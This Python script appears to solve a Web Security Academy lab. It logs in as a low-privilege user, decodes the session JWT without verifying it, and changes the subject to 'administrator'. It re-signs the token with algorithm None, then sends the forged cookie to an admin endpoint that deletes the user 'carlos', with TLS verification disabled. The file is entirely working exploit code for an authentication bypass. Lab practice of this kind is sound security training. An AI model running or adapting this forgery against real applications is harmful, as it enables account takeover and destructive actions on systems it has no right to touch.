#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote
import jwt
import base64


session = requests.Session()
url = 'https://0a4b00b604f9701d8568f8fe00e60012.web-security-academy.net'

response = session.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False,
)

token =  response.headers['Set-Cookie'].split('; ')[0].split('=')[1]

decode_token = jwt.decode(token, options={"verify_signature":False})
print(f"Decode token: {decode_token}\n")

decode_token['sub'] = 'administrator'
print(f"Modified payload : {decode_token}\n")

modified_token = jwt.encode(decode_token, None, algorithm=None).decode()
print(f"Modified token : {modified_token}\n")

session_data = modified_token
cookies = {
    'session' : session_data,

}

response = requests.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
